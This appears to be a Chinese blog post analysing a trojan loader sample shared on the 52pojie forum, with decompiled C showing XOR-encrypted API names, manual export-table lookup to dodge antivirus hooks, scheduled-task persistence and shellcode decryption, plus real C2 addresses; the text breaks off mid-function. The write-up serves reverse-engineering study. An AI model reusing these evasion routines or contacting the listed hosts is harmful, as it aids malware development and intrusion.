            <a href="javascript:void(0);" data-url="https://shanzade.github.io/2025/12/07/%E8%B7%9F%E7%9D%8052pojie%E5%A4%A7%E4%BD%AC%E5%88%86%E6%9E%90%E4%B8%80%E4%BB%BD%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC/" data-id="cmjjqvfjn0007ekvgalrm76ss" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
        </div><!-- .comments-link -->
      </header><!-- .entry-header -->

    <div class="entry-content">
      
        <blockquote>
<p>样本：<br><a target="_blank" rel="noopener" href="https://www.52pojie.cn/forum.php?mod=viewthread&tid=2063618&page=1&extra=#pid53963559">https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=2063618&amp;page=1&amp;extra=#pid53963559</a><br>原帖：<br><a target="_blank" rel="noopener" href="https://www.52pojie.cn//thread-2063616-1-1.html">https://www.52pojie.cn//thread-2063616-1-1.html</a><br>分析：<br><a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-2075186-1-1.html">https://www.52pojie.cn/thread-2075186-1-1.html</a></p>
</blockquote>
<h2 id="查壳——基本分析"><a href="#查壳——基本分析" class="headerlink" title="查壳——基本分析"></a>查壳——基本分析</h2><h3 id="WindowsEvent-exe"><a href="#WindowsEvent-exe" class="headerlink" title="WindowsEvent.exe"></a>WindowsEvent.exe</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Image is 32bit executable</span><br><span class="line">*Unknown exe , EP : 56 E8 .. , 02 sections  [ Linker 14.00 ]  Std Compiler section  or Asm demo/example (2025-08-04) [ Win Vista ][ No Import ] </span><br></pre></td></tr></table></figure>
<p>仅有 2 个段，<code>.text</code> 和 <code>.reloc</code></p>
<h3 id="Guard-dll"><a href="#Guard-dll" class="headerlink" title="Guard.dll"></a>Guard.dll</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DLL 32 bit-Library image</span><br><span class="line">Microsoft Visual C++ v.7.10 DLL (55 8B) - 14.44 - Visual Studio 20xx  [ Win Vista ] [Debug 13]  2025-08-26</span><br></pre></td></tr></table></figure>
<p>有 5 个段，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text</span><br><span class="line">.rdata</span><br><span class="line">.data</span><br><span class="line">.fptable</span><br><span class="line">.reloc</span><br></pre></td></tr></table></figure>
<h2 id="在线沙箱分析"><a href="#在线沙箱分析" class="headerlink" title="在线沙箱分析"></a>在线沙箱分析</h2><p><a target="_blank" rel="noopener" href="https://sandbox.ti.qianxin.com/sandbox/page/detail?type=file&id=AZrkvUKiSZq0HOVf1e4d">https://sandbox.ti.qianxin.com/sandbox/page/detail?type=file&amp;id=AZrkvUKiSZq0HOVf1e4d</a><br><a target="_blank" rel="noopener" href="https://sandbox.ti.qianxin.com/sandbox/page/detail?type=file&id=93e8ec6b05c7c8ba86acc542d9f5e9756ded3fbe">https://sandbox.ti.qianxin.com/sandbox/page/detail?type=file&amp;id=93e8ec6b05c7c8ba86acc542d9f5e9756ded3fbe</a><br><code>agentb</code>, <code>silverfox</code></p>
<h3 id="dll-调用情况"><a href="#dll-调用情况" class="headerlink" title="dll 调用情况"></a>dll 调用情况</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32\apphelp.dll</span><br><span class="line">C:\Windows\System32\mswsock.dll</span><br><span class="line">C:\Windows\System32\rasadhlp.dll</span><br><span class="line">ntdll</span><br><span class="line">KERNEL32.DLL</span><br><span class="line">C:\Windows\system32\mswsock.dll</span><br><span class="line">rpcrt4.dll</span><br><span class="line">ntdll.dll</span><br><span class="line">Ws2_32.dll</span><br><span class="line">C:\Windows\System32\fwpuclnt.dll</span><br></pre></td></tr></table></figure>
<h3 id="网络通信记录"><a href="#网络通信记录" class="headerlink" title="网络通信记录"></a>网络通信记录</h3><p>因为确实调用到了 <code>Ws2_32.dll</code>，所以可以猜测有上传数据或 c2 连接。（？）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">156.234.119.138:80</span><br><span class="line">156.234.119.138:443</span><br><span class="line">syumineyt.top</span><br></pre></td></tr></table></figure>

<h2 id="WindowsEvent-exe-1"><a href="#WindowsEvent-exe-1" class="headerlink" title="WindowsEvent.exe"></a>WindowsEvent.exe</h2><p>没有字符串内容，没有函数名（stripped）<br>因为是近期的病毒，感觉面向群体都是 win10 及以上的用户，正好没有配置 win10 的环境，也没有办法动调了，沙箱的 win7 检测也没有任何结果。</p>
<h3 id="start"><a href="#start" class="headerlink" title="start()"></a><code>start()</code></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">start</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// esi</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !sub_4002F5() )                          <span class="comment">// 初始化——获取 kernel32 函数地址</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  v0 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( sub_4004B8() )                           <span class="comment">// 文件路径处理判断</span></span><br><span class="line">  &#123;</span><br><span class="line">    sub_400593();                               <span class="comment">// 计划任务</span></span><br><span class="line">    sub_400660();                               <span class="comment">// 解密 &amp; 执行 shellcode</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="sub-4002f5——初始化"><a href="#sub-4002f5——初始化" class="headerlink" title="sub_4002f5——初始化"></a><code>sub_4002f5</code>——初始化</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// write access to const memory has been detected, the output may be wrong!</span></span><br><span class="line">BOOL <span class="title function_">sub_4002F5</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> handle0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> handle1; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">char</span> lpszReadFile[<span class="number">9</span>]; <span class="comment">// [esp+3h] [ebp-81h] BYREF</span></span><br><span class="line">  <span class="type">char</span> lpszVirtualFree[<span class="number">12</span>]; <span class="comment">// [esp+Ch] [ebp-78h] BYREF</span></span><br><span class="line">  <span class="type">char</span> lpszVirtualAlloc[<span class="number">13</span>]; <span class="comment">// [esp+18h] [ebp-6Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> lpszCreateProcessA[<span class="number">15</span>]; <span class="comment">// [esp+25h] [ebp-5Fh] BYREF</span></span><br><span class="line">  <span class="type">char</span> lpszVirtualProtect[<span class="number">15</span>]; <span class="comment">// [esp+34h] [ebp-50h] BYREF</span></span><br><span class="line">  <span class="type">char</span> lpszGetFileSize[<span class="number">12</span>]; <span class="comment">// [esp+43h] [ebp-41h] BYREF</span></span><br><span class="line">  <span class="type">char</span> lpszCloseHandle[<span class="number">12</span>]; <span class="comment">// [esp+4Fh] [ebp-35h] BYREF</span></span><br><span class="line">  <span class="type">char</span> lpszCreateFileA[<span class="number">12</span>]; <span class="comment">// [esp+5Bh] [ebp-29h] BYREF</span></span><br><span class="line">  <span class="type">char</span> lpszKernel32[<span class="number">29</span>]; <span class="comment">// [esp+67h] [ebp-1Dh] BYREF</span></span><br><span class="line"></span><br><span class="line">  xor_6ah_400488(lpszKernel32, sub_4009E0);     <span class="comment">// kernel32.dll</span></span><br><span class="line">  xor_6ah_400488(lpszCreateFileA, (_BYTE *)&amp;loc_4009ED + <span class="number">1</span>);<span class="comment">// CreateFileA</span></span><br><span class="line">  xor_6ah_400488(lpszCloseHandle, &amp;byte_4009FB);<span class="comment">// CloseHandle</span></span><br><span class="line">  xor_6ah_400488(lpszGetFileSize, dword_400A08);<span class="comment">// GetFileSize</span></span><br><span class="line">  xor_6ah_400488(lpszVirtualAlloc, byte_400A15);<span class="comment">// VirtualAlloc</span></span><br><span class="line">  xor_6ah_400488(lpszVirtualFree, &amp;byte_400A23);<span class="comment">// VirtualFree</span></span><br><span class="line">  xor_6ah_400488(lpszReadFile, sub_400A30);     <span class="comment">// ReadFile</span></span><br><span class="line">  xor_6ah_400488(lpszVirtualProtect, sub_400A3A);<span class="comment">// VirtualProtect</span></span><br><span class="line">  xor_6ah_400488(lpszCreateProcessA, &amp;loc_400A5E);<span class="comment">// CreateProcessA</span></span><br><span class="line">  handle0 = loadlibrary_400200(lpszKernel32);   <span class="comment">// 200 加载 / 读取 dll（kernel32.dll）</span></span><br><span class="line">  <span class="keyword">if</span> ( !handle0 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  handle1 = handle0;</span><br><span class="line">  pFnCreateFileA = (<span class="type">int</span> *)getprocaddress_400271(handle0, (<span class="type">int</span>)lpszCreateFileA);<span class="comment">// 271 根据函数字符串，从句柄或文件中获取函数地址</span></span><br><span class="line">  pFnCloseHandle = (<span class="type">int</span> *)getprocaddress_400271(handle1, (<span class="type">int</span>)lpszCloseHandle);</span><br><span class="line">  pFnGetFileSize = (<span class="type">int</span> *)getprocaddress_400271(handle1, (<span class="type">int</span>)lpszGetFileSize);</span><br><span class="line">  pFnVirtualAlloc = (<span class="type">int</span> *)getprocaddress_400271(handle1, (<span class="type">int</span>)lpszVirtualAlloc);</span><br><span class="line">  pFnVirtualFree = (<span class="type">int</span> (__stdcall *)(_DWORD, _DWORD, _DWORD))getprocaddress_400271(handle1, (<span class="type">int</span>)lpszVirtualFree);</span><br><span class="line">  pFnReadFile = (<span class="type">int</span> *)getprocaddress_400271(handle1, (<span class="type">int</span>)lpszReadFile);</span><br><span class="line">  pFnVirtualProtect = (<span class="type">int</span> *)getprocaddress_400271(handle1, (<span class="type">int</span>)lpszVirtualProtect);</span><br><span class="line">  pFnCreateProcessA_4009DC = getprocaddress_400271(handle1, (<span class="type">int</span>)lpszCreateProcessA);</span><br><span class="line">  <span class="keyword">return</span> _mm_movemask_epi8(</span><br><span class="line">           _mm_packs_epi32(</span><br><span class="line">             _mm_cmpeq_epi32((__m128i)<span class="number">0</span>i64, *(__m128i *)&amp;pFnCreateFileA),</span><br><span class="line">             _mm_cmpeq_epi32(</span><br><span class="line">               (__m128i)_mm_shuffle_ps(</span><br><span class="line">                          _mm_unpacklo_ps(</span><br><span class="line">                            (__m128)*(<span class="type">unsigned</span> __int64 *)&amp;pFnReadFile,</span><br><span class="line">                            (__m128)(<span class="type">unsigned</span> <span class="type">int</span>)pFnVirtualFree),</span><br><span class="line">                          _mm_shuffle_ps(</span><br><span class="line">                            (__m128)_mm_cvtsi32_si128(pFnCreateProcessA_4009DC),</span><br><span class="line">                            (__m128)*(<span class="type">unsigned</span> __int64 *)&amp;pFnReadFile,</span><br><span class="line">                            <span class="number">212</span>),</span><br><span class="line">                          <span class="number">33</span>),</span><br><span class="line">               (__m128i)<span class="number">0</span>i64))) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="xor-6ah-400488"><a href="#xor-6ah-400488" class="headerlink" title="xor_6ah_400488()"></a><code>xor_6ah_400488()</code></h4><p>对传入的数据异或 0x6a 解密，避免了函数名硬编码的静态分析风险。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *__cdecl <span class="title function_">xor_400488</span><span class="params">(<span class="type">char</span> *arrays, _BYTE *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// esi</span></span><br><span class="line"></span><br><span class="line">  result = arrays;</span><br><span class="line">  v3 = (<span class="type">unsigned</span> __int8)*a2;</span><br><span class="line">  <span class="keyword">if</span> ( *a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      arrays[v4] = a2[v4 + <span class="number">1</span>] ^ <span class="number">0x6A</span>;</span><br><span class="line">      ++v4;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v3 != v4 );</span><br><span class="line">  &#125;</span><br><span class="line">  arrays[v3] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="异或结果（手搓脚本）"><a href="#异或结果（手搓脚本）" class="headerlink" title="异或结果（手搓脚本）"></a>异或结果（手搓脚本）</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">dt = []</span><br><span class="line">dt.append([<span class="number">0x01</span>, <span class="number">0x0F</span>, <span class="number">0x18</span>, <span class="number">0x04</span>, <span class="number">0x0F</span>, <span class="number">0x06</span>, <span class="number">0x59</span>, <span class="number">0x58</span>, <span class="number">0x44</span>, <span class="number">0x0E</span>, <span class="number">0x06</span>, <span class="number">0x06</span>])</span><br><span class="line">dt.append([<span class="number">0x29</span>, <span class="number">0x18</span>, <span class="number">0xf</span>, <span class="number">0xb</span>, <span class="number">0x1e</span>, <span class="number">0xf</span>, <span class="number">0x2c</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">0xf</span>, <span class="number">0x2b</span>])</span><br><span class="line">dt.append([<span class="number">0x29</span>, <span class="number">0x06</span>, <span class="number">0x05</span>, <span class="number">0x19</span>, <span class="number">0x0F</span>, <span class="number">0x22</span>, <span class="number">0x0B</span>, <span class="number">0x04</span>, <span class="number">0x0E</span>, <span class="number">0x06</span>, <span class="number">0x0F</span>])</span><br><span class="line">dt.append([<span class="number">0x2D</span>, <span class="number">0x0F</span>, <span class="number">0x1E</span>, <span class="number">0x2C</span>, <span class="number">0x03</span>, <span class="number">0x06</span>, <span class="number">0x0F</span>, <span class="number">0x39</span>, <span class="number">0x03</span>, <span class="number">0x10</span>, <span class="number">0x0F</span>])</span><br><span class="line">dt.append([<span class="number">0x3C</span>, <span class="number">0x03</span>, <span class="number">0x18</span>, <span class="number">0x1E</span>, <span class="number">0x1F</span>, <span class="number">0x0B</span>, <span class="number">0x06</span>, <span class="number">0x2B</span>, <span class="number">0x06</span>, <span class="number">0x06</span>, <span class="number">0x05</span>, <span class="number">0x09</span>])</span><br><span class="line">dt.append([<span class="number">0x3C</span>, <span class="number">0x03</span>, <span class="number">0x18</span>, <span class="number">0x1E</span>, <span class="number">0x1F</span>, <span class="number">0x0B</span>, <span class="number">0x06</span>, <span class="number">0x2C</span>, <span class="number">0x18</span>, <span class="number">0x0F</span>, <span class="number">0x0F</span>])</span><br><span class="line">dt.append([<span class="number">0x38</span>, <span class="number">0x0F</span>, <span class="number">0x0B</span>, <span class="number">0x0E</span>, <span class="number">0x2C</span>, <span class="number">0x03</span>, <span class="number">0x06</span>, <span class="number">0x0F</span>])</span><br><span class="line">dt.append([<span class="number">0x3C</span>, <span class="number">0x03</span>, <span class="number">0x18</span>, <span class="number">0x1E</span>, <span class="number">0x1F</span>, <span class="number">0x0B</span>, <span class="number">0x06</span>, <span class="number">0x3A</span>, <span class="number">0x18</span>, <span class="number">0x05</span>, <span class="number">0x1E</span>, <span class="number">0x0F</span>, <span class="number">0x09</span>, <span class="number">0x1E</span>])</span><br><span class="line">dt.append([<span class="number">0x29</span>, <span class="number">0x18</span>, <span class="number">0x0F</span>, <span class="number">0x0B</span>, <span class="number">0x1E</span>, <span class="number">0x0F</span>, <span class="number">0x3A</span>, <span class="number">0x18</span>, <span class="number">0x05</span>, <span class="number">0x09</span>, <span class="number">0x0F</span>, <span class="number">0x19</span>, <span class="number">0x19</span>, <span class="number">0x2B</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">enumerate</span>(dt):</span><br><span class="line">    dt[i] = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(k ^ <span class="number">0x6a</span>) <span class="keyword">for</span> k <span class="keyword">in</span> j])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dt:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">kernel32.dll</span></span><br><span class="line"><span class="string">CreateFileA</span></span><br><span class="line"><span class="string">CloseHandle</span></span><br><span class="line"><span class="string">GetFileSize</span></span><br><span class="line"><span class="string">VirtualAlloc</span></span><br><span class="line"><span class="string">VirtualFree</span></span><br><span class="line"><span class="string">ReadFile</span></span><br><span class="line"><span class="string">VirtualProtect</span></span><br><span class="line"><span class="string">CreateProcessA</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<h4 id="getprocaddress-400271"><a href="#getprocaddress-400271" class="headerlink" title="getprocaddress_400271()"></a><code>getprocaddress_400271()</code></h4><p>分析 dll 的 pe 头找到 eat 导出表，再通过导出表找到需要的函数。<br>这里应该是规避了动态分析和检测，正常调用 <code>GetProcAddress()</code> 获取一些敏感的函数确实会被杀毒软件阻止。<br>这里需要注意的是，因为 exe 是 32 位的，所以查找的 <code>kernel32.dll</code> 应该是 <code>SysWOW64</code> 下的。<br>这边顺带也复习了一下 pe 头和导出表的相关内容。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_400271</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> lpszFuncName)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> dwPeHeaderOffset; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> dwExportVA; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// ebp</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp+0h] [ebp-18h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">0</span>;                                   <span class="comment">// 注意该 exe 为 32 位映像</span></span><br><span class="line">                                                <span class="comment">// 查找对应的 kernel32.dll 时应该查找 syswow64 下的 dll</span></span><br><span class="line">  <span class="keyword">if</span> ( *(_WORD *)a1 == <span class="number">0x5A4D</span> )                 <span class="comment">// 4d 5a mz dos 头</span></span><br><span class="line">  &#123;</span><br><span class="line">    dwPeHeaderOffset = *(_DWORD *)(a1 + <span class="number">0x3C</span>);  <span class="comment">// 整数计算 a1 + 0x3c 为 pe nt 头的偏移位置</span></span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)(a1 + dwPeHeaderOffset) == <span class="number">0x4550</span> )<span class="comment">// 50 45 00 00 PE (@ 0f8h)</span></span><br><span class="line">    &#123;</span><br><span class="line">      dwExportVA = *(_DWORD *)(a1 + dwPeHeaderOffset + <span class="number">0x78</span>);<span class="comment">// 0f8h + 78h = 170h 导出表 RVA</span></span><br><span class="line">      <span class="keyword">if</span> ( dwExportVA )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *(_DWORD *)(a1 + dwExportVA + <span class="number">0x18</span>) )<span class="comment">// 运行时定位：@93ea0h</span></span><br><span class="line">                                                <span class="comment">// 文件定位：93ea0h - 80000h + 6d000h = @80ea0h</span></span><br><span class="line">                                                <span class="comment">// x + 0x18 = NumberOfNames</span></span><br><span class="line">        &#123;</span><br><span class="line">          v5 = a1 + *(_DWORD *)(a1 + dwExportVA + <span class="number">0x20</span>);<span class="comment">// AddressOfNames</span></span><br><span class="line">          v8 = a1 + *(_DWORD *)(a1 + dwExportVA + <span class="number">0x24</span>);<span class="comment">// AddressOfNameOrdinals</span></span><br><span class="line">          v7 = a1 + *(_DWORD *)(a1 + dwExportVA + <span class="number">0x1C</span>);<span class="comment">// AddressOfFunctions</span></span><br><span class="line">          v6 = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">while</span> ( !sub_4006DC(a1 + *(_DWORD *)(v5 + <span class="number">4</span> * v6), lpszFuncName) )<span class="comment">// 遍历比较导出表与函数名</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)++v6 &gt;= *(_DWORD *)(a1 + dwExportVA + <span class="number">0x18</span>) )<span class="comment">// 没有查找到指定函数名</span></span><br><span class="line">              <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">return</span> *(_DWORD *)(v7 + <span class="number">4</span> * *(<span class="type">unsigned</span> __int16 *)(v8 + <span class="number">2</span> * v6)) + a1;<span class="comment">// 查找 ordinals 并返回对应函数地址</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="sub-4004B8-——路径处理"><a href="#sub-4004B8-——路径处理" class="headerlink" title="sub_4004B8()——路径处理"></a><code>sub_4004B8()</code>——路径处理</h3><p>这部分没看太懂，静态分析还是不够的。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_4004B8</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> (__stdcall *pFnGetModuleFileNameA)(_DWORD, <span class="type">char</span> *, <span class="type">int</span>); <span class="comment">// edi</span></span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">char</span> *i; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// al</span></span><br><span class="line">  _BYTE *j; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v9; <span class="comment">// dl</span></span><br><span class="line">  <span class="type">char</span> v11[<span class="number">13</span>]; <span class="comment">// [esp+0h] [ebp-130h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v12[<span class="number">19</span>]; <span class="comment">// [esp+Dh] [ebp-123h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v13; <span class="comment">// [esp+20h] [ebp-110h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v14; <span class="comment">// [esp+21h] [ebp-10Fh] BYREF</span></span><br><span class="line"></span><br><span class="line">  xor_6ah_400488(v11, sub_4009E0);              <span class="comment">// kernel32.dll</span></span><br><span class="line">  v0 = loadlibrary_400200(v11);                 <span class="comment">// 加载模块</span></span><br><span class="line">  <span class="keyword">if</span> ( !v0 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v1 = v0;</span><br><span class="line">  xor_6ah_400488(v12, (_BYTE *)&amp;loc_400A49 + <span class="number">1</span>);<span class="comment">// GetModuleFileNameA</span></span><br><span class="line">  pFnGetModuleFileNameA = (<span class="type">int</span> (__stdcall *)(_DWORD, <span class="type">char</span> *, <span class="type">int</span>))getprocaddress_400271(v1, (<span class="type">int</span>)v12);<span class="comment">// 查找函数</span></span><br><span class="line">  v3 = &amp;v13;</span><br><span class="line">  sub_4007A2((<span class="type">int</span>)&amp;v13, <span class="number">0</span>, <span class="number">260</span>);                <span class="comment">// memset？</span></span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( pFnGetModuleFileNameA &amp;&amp; pFnGetModuleFileNameA(<span class="number">0</span>, &amp;v13, <span class="number">260</span>) )<span class="comment">// 获取当前 exe 的路径，放到 v13</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = &amp;v14; ; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = (<span class="type">unsigned</span> __int8)*(i - <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v6 == <span class="string">&#x27;/&#x27;</span> || v6 == <span 